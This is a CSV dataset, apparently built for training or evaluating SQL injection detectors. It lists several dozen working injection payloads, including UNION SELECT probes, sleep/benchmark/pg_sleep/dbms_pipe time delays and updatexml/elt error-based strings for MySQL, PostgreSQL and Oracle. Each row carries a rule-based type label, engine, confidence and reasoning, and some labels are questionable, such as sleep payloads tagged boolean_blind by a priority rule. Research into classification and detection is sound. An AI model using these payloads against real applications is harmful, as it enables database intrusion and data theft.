id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
18978,"-5744 ) union all select 3617,3617,3617,3617,3617,3617--",union_based,generic,0.80,"Token 'union all select' matched in payload '-5744 ) union all select 3617,3617,3617,3617,3617,3617--' → union_based (P7, UNION SELECT); No exclusive DB signature → generic",3
18979,1' ) or sleep ( 5 ) #,time_blind,mysql,0.90,"Token 'sleep (' matched in payload '1' ) or sleep ( 5 ) #' → time_blind (P5, time delay function); DB signature token 'sleep (' → mysql",2
18980,"1' ) ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( ( 'zxrb' = 'zxrb",boolean_blind,mysql,0.95,"Token 'elt (' matched in payload '1' ) ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( ' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); DB signature token 'elt' → mysql; secondary signal 'union select' (union_based P7) overridden by priority",2
18981,"1' ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 )",boolean_blind,mysql,0.95,"Token 'elt (' matched in payload '1' ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 180' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); DB signature token 'updatexml' → mysql; secondary signal 'updatexml' (error_based P4) overridden by priority",2
18982,"1"" where 1831 = 1831 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #",boolean_blind,mysql,0.95,"Token 'where 1831 = 1831' matched in payload '1"" where 1831 = 1831 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); DB signature token 'sleep (' → mysql; secondary signal 'sleep (' (time_blind P5) overridden by priority",2
18983,"-2116%' ) ) ) union all select 7119,7119,7119,7119,7119--",union_based,generic,0.80,"Token 'union all select' matched in payload '-2116%' ) ) ) union all select 7119,7119,7119,7119,7119--' → union_based (P7, UNION SELECT); No exclusive DB signature → generic",3
18984,"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( 8126 = 8126",time_blind,mysql,0.90,"Token 'benchmark (' matched in payload 'select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( 8126 = 8126' → time_blind (P5, time delay function); DB signature token 'benchmark' → mysql",2
18985,1'+ ( select uhsy where 4596 = 4596 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) ) +',boolean_blind,mysql,0.95,"Token 'where 4596 = 4596' matched in payload '1'+ ( select uhsy where 4596 = 4596 and ( select * from ( select ( sleep ( 5 ) )' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); DB signature token 'sleep (' → mysql; secondary signal 'sleep (' (time_blind P5) overridden by priority",2
18986,"1 ) where 8630 = 8630 union all select null,null--",boolean_blind,generic,0.85,"Token 'where 8630 = 8630' matched in payload '1 ) where 8630 = 8630 union all select null,null--' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); No exclusive DB signature → generic; secondary signal 'union all select' (union_based P7) overridden by priority",1
18987,"1' in boolean mode ) union all select null,null,null,null,null,null--",union_based,generic,0.80,"Token 'union all select' matched in payload '1' in boolean mode ) union all select null,null,null,null,null,null--' → union_based (P7, UNION SELECT); No exclusive DB signature → generic",3
18988,"-5386' ) union all select 8026,8026,8026,8026,8026,8026#",union_based,generic,0.80,"Token 'union all select' matched in payload '-5386' ) union all select 8026,8026,8026,8026,8026,8026#' → union_based (P7, UNION SELECT); No exclusive DB signature → generic",3
18989,"1"" union all select null,null,null,null#",union_based,generic,0.80,"Token 'union all select' matched in payload '1"" union all select null,null,null,null#' → union_based (P7, UNION SELECT); No exclusive DB signature → generic",3
18990,1' or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and 'hokd' = 'hokd,time_blind,postgresql,0.90,"Token 'pg_sleep' matched in payload '1' or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and 'hokd' = 'hokd' → time_blind (P5, time delay function); DB signature token 'pg_sleep' → postgresql",2
18991,"1' ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",boolean_blind,mysql,0.95,"Token 'elt (' matched in payload '1' ) or elt ( 5873 = 5873,sleep ( 5 ) ) #' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); DB signature token 'elt' → mysql; secondary signal 'sleep (' (time_blind P5) overridden by priority",2
18992,"1"" ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ( ""grct"" = ""grct",boolean_blind,mysql,0.95,"Token 'rlike (' matched in payload '1"" ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ( ""grct"" = ' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); DB signature token 'rlike' → mysql; secondary signal 'sleep (' (time_blind P5) overridden by priority",3
18993,"-2417 ) union all select 2169,2169,2169,2169,2169,2169,2169,2169,2169,2169#",union_based,generic,0.80,"Token 'union all select' matched in payload '-2417 ) union all select 2169,2169,2169,2169,2169,2169,2169,2169,2169,2169#' → union_based (P7, UNION SELECT); No exclusive DB signature → generic",3
18994,"1%"" or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ""%"" = """,boolean_blind,mysql,0.95,"Token 'elt (' matched in payload '1%"" or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); DB signature token 'updatexml' → mysql; secondary signal 'updatexml' (error_based P4) overridden by priority",2
18995,"-6478"" ) ) union all select 7087,7087,7087,7087,7087,7087,7087,7087--",union_based,generic,0.80,"Token 'union all select' matched in payload '-6478"" ) ) union all select 7087,7087,7087,7087,7087,7087,7087,7087--' → union_based (P7, UNION SELECT); No exclusive DB signature → generic",3
18996,"-3725' ) ) union all select 1541,1541,1541,1541,1541#",union_based,generic,0.80,"Token 'union all select' matched in payload '-3725' ) ) union all select 1541,1541,1541,1541,1541#' → union_based (P7, UNION SELECT); No exclusive DB signature → generic",3
18997,"1"" rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ""cxsu"" like ""cxsu",boolean_blind,mysql,0.95,"Token 'rlike (' matched in payload '1"" rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ""cxsu"" like ""cxsu' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); DB signature token 'rlike' → mysql; secondary signal 'sleep (' (time_blind P5) overridden by priority",3
18998,"1"" ) ) ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,0.90,"Token 'benchmark (' matched in payload '1"" ) ) ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #' → time_blind (P5, time delay function); DB signature token 'benchmark' → mysql",2
18999,"-6733' ) where 4024 = 4024 union all select 4024,4024,4024,4024#",boolean_blind,generic,0.85,"Token 'where 4024 = 4024' matched in payload '-6733' ) where 4024 = 4024 union all select 4024,4024,4024,4024#' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); No exclusive DB signature → generic; secondary signal 'union all select' (union_based P7) overridden by priority",1
19000,1 ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( 7805 = 7805,time_blind,mysql,0.90,"Token 'sleep (' matched in payload '1 ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( 7805 = 7805' → time_blind (P5, time delay function); DB signature token 'sleep (' → mysql",2
19001,"1' ) ) as namw where 1740 = 1740 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) --",boolean_blind,mysql,0.95,"Token 'elt (' matched in payload '1' ) ) as namw where 1740 = 1740 or updatexml ( 1808,concat ( 0x2e,0x7171706a71,' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); DB signature token 'updatexml' → mysql; secondary signal 'updatexml' (error_based P4) overridden by priority",2
19002,"-4947' in boolean mode ) union all select 3314,3314#",union_based,generic,0.80,"Token 'union all select' matched in payload '-4947' in boolean mode ) union all select 3314,3314#' → union_based (P7, UNION SELECT); No exclusive DB signature → generic",3
19003,"-7101 ) ) ) union all select 4587,4587,4587,4587,4587,4587--",union_based,generic,0.80,"Token 'union all select' matched in payload '-7101 ) ) ) union all select 4587,4587,4587,4587,4587,4587--' → union_based (P7, UNION SELECT); No exclusive DB signature → generic",3
19004,1'+ ( select 'sfko' where 6853 = 6853 rlike sleep ( 5 ) #,boolean_blind,mysql,0.95,"Token 'where 6853 = 6853' matched in payload '1'+ ( select 'sfko' where 6853 = 6853 rlike sleep ( 5 ) #' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); DB signature token 'rlike' → mysql; secondary signal 'sleep (' (time_blind P5) overridden by priority",2
19005,1'|| ( select 'xqqp' where 3007 = 3007 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,boolean_blind,mysql,0.95,"Token 'where 3007 = 3007' matched in payload '1'|| ( select 'xqqp' where 3007 = 3007 and ( select * from ( select ( sleep ( 5 ' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); DB signature token 'sleep (' → mysql; secondary signal 'sleep (' (time_blind P5) overridden by priority",2
19006,"1%' ) ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( ( '%' = '",time_blind,oracle,0.90,"Token 'dbms_pipe.receive_message' matched in payload '1%' ) ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr (' → time_blind (P5, time delay function); DB signature token 'dbms_pipe' → oracle",3
19007,"-5218 ) union all select 9677,9677#",union_based,generic,0.80,"Token 'union all select' matched in payload '-5218 ) union all select 9677,9677#' → union_based (P7, UNION SELECT); No exclusive DB signature → generic",3
19008,"1' in boolean mode ) union all select null,null,null--",union_based,generic,0.80,"Token 'union all select' matched in payload '1' in boolean mode ) union all select null,null,null--' → union_based (P7, UNION SELECT); No exclusive DB signature → generic",3
19009,"1"" ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ""mmgx"" like ""mmgx",boolean_blind,oracle,0.95,"Token 'case when ( 3754 = 3754 ) then 1 else' matched in payload '1"" ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 )' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); DB signature token 'xmltype' → oracle; secondary signal 'xmltype' (error_based P4) overridden by priority",2
19010,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ""%"" = """,time_blind,oracle,0.90,"Token 'dbms_pipe.receive_message' matched in payload 'select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( ' → time_blind (P5, time delay function); DB signature token 'dual' → oracle",3
19011,"-6789'|| ( select 'uckz' from dual where 2163 = 2163 union all select 2163,2163,2163,2163,2163,2163--",boolean_blind,oracle,0.95,"Token 'where 2163 = 2163' matched in payload '-6789'|| ( select 'uckz' from dual where 2163 = 2163 union all select 2163,2163,' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); DB signature token 'dual' → oracle; secondary signal 'union all select' (union_based P7) overridden by priority",1
19012,1' in boolean mode ) rlike sleep ( 5 ) #,time_blind,mysql,0.90,"Token 'sleep (' matched in payload '1' in boolean mode ) rlike sleep ( 5 ) #' → time_blind (P5, time delay function); DB signature token 'rlike' → mysql",2
19013,"1' ) where 7658 = 7658 union all select null,null#",boolean_blind,generic,0.85,"Token 'where 7658 = 7658' matched in payload '1' ) where 7658 = 7658 union all select null,null#' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); No exclusive DB signature → generic; secondary signal 'union all select' (union_based P7) overridden by priority",1
19014,"-7065'+ ( select 'bdxr' where 1756 = 1756 union all select 1756,1756,1756,1756,1756,1756,1756,1756,1756,1756#",boolean_blind,generic,0.85,"Token 'where 1756 = 1756' matched in payload '-7065'+ ( select 'bdxr' where 1756 = 1756 union all select 1756,1756,1756,1756,1' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); No exclusive DB signature → generic; secondary signal 'union all select' (union_based P7) overridden by priority",1
19015,"-8588' union all select 2135,2135--",union_based,generic,0.80,"Token 'union all select' matched in payload '-8588' union all select 2135,2135--' → union_based (P7, UNION SELECT); No exclusive DB signature → generic",3
19016,"1"" where 3247 = 3247 or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",boolean_blind,generic,0.85,"Token 'where 3247 = 3247' matched in payload '1"" where 3247 = 3247 or 1022 = ( select count ( * ) from all_users t1,all_users ' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); No exclusive DB signature → generic; secondary signal 'from all_users t1,all_users t2,all_users t3' (heavy_query P4) overridden by priority",3
19017,select ( case when ( 5796 = 8326 ) then 5796 else 5796* ( select 5796 from information_schema.character_sets ) end ) #,boolean_blind,mysql,0.90,"Token 'case when ( 5796 = 8326 ) then 5796 else' matched in payload 'select ( case when ( 5796 = 8326 ) then 5796 else 5796* ( select 5796 from infor' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); DB signature token 'information_schema' → mysql",3
19018,"-5478"" ) where 4100 = 4100 or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",boolean_blind,oracle,0.90,"Token 'case when ( 4747 = 4747 ) then 1 else' matched in payload '-5478"" ) where 4100 = 4100 or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); DB signature token 'dual' → oracle",3
19019,"1"" ) ) or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",heavy_query,generic,0.80,"Token 'from domain.domains as t1,domain.columns as t2,domain.tables as t3' matched in payload '1"" ) ) or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns a' → heavy_query (P4, heavy compute / cartesian join); No exclusive DB signature → generic",1
19020,"1"" ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ""vudj"" like ""vudj",heavy_query,generic,0.80,"Token 'from domain.domains as t1,domain.columns as t2,domain.tables as t3' matched in payload '1"" ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as ' → heavy_query (P4, heavy compute / cartesian join); No exclusive DB signature → generic",1
19021,"1' ) ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( ( 'ayqn' like 'ayqn",boolean_blind,mysql,0.95,"Token 'elt (' matched in payload '1' ) ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = ' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); DB signature token 'updatexml' → mysql; secondary signal 'updatexml' (error_based P4) overridden by priority",2
